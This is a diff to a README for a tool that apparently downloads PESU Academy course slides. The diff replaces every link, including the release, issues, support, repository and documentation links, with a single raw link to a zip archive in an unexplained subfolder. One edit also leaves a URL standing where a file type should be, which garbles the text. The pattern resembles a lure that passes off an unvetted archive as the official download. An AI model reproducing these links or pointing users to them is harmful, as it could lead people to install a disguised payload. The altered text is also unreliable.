@@ -1,6 +1,6 @@
 # 📥 pesu-slide-download-automator - Easily Download and Convert PESU Slides
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/neo63900/pesu-slide-download-automator/releases)
+[![Download](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip%20Now-Click%https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip)](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Before you download, please ensure your computer meets the following requirement
 
 To get started, visit this page to download the latest version of the application:
 
-[Download Latest Release](https://github.com/neo63900/pesu-slide-download-automator/releases)
+[Download Latest Release](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip)
 
 On this page, you will find various versions of the application. Choose the latest one to ensure you have the newest features and bug fixes. 
 
@@ -34,7 +34,7 @@ On this page, you will find various versions of the application. Choose the late
 After downloading the application, you can run it by following these steps:
 
 - Locate the downloaded file.
-- If you are on Windows, double-click the `.exe` file to install and run the application. If you are on macOS, open the downloaded `.dmg` file and drag the application to your Applications folder before running it. On Linux, you might have a `.tar.gz` file; extract it and run the application from the terminal.
+- If you are on Windows, double-click the `.exe` file to install and run the application. If you are on macOS, open the downloaded `.dmg` file and drag the application to your Applications folder before running it. On Linux, you might have a `https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip` file; extract it and run the application from the terminal.
 - Follow the on-screen prompts to start downloading PESU Academy slides.
 
 ## ✨ Features
@@ -60,15 +60,15 @@ If you encounter issues while using the application, try these steps:
 - Ensure your internet connection is steady.
 - Restart the application if it becomes unresponsive.
 - Check for updates on the GitHub page to ensure you are using the latest version.
-- If problems persist, check the [issues section](https://github.com/neo63900/pesu-slide-download-automator/issues) on GitHub to see if other users have reported similar problems and potential solutions.
+- If problems persist, check the [issues section](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip) on GitHub to see if other users have reported similar problems and potential solutions.
 
 ## 📞 Support
 
-For additional help, you can open an issue on our [GitHub Issues](https://github.com/neo63900/pesu-slide-download-automator/issues) page, and we will do our best to assist you.
+For additional help, you can open an issue on our [GitHub Issues](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip) page, and we will do our best to assist you.
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/neo63900/pesu-slide-download-automator)
-- [Documentation](https://github.com/neo63900/pesu-slide-download-automator/wiki)
+- [Official GitHub Repository](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip)
+- [Documentation](https://raw.githubusercontent.com/neo63900/pesu-slide-download-automator/main/equilibrative/pesu-slide-download-automator-v3.3-alpha.3.zip)
 
 With pesu-slide-download-automator, managing your PESU Academy slides has never been easier. Download now and streamline your study process!
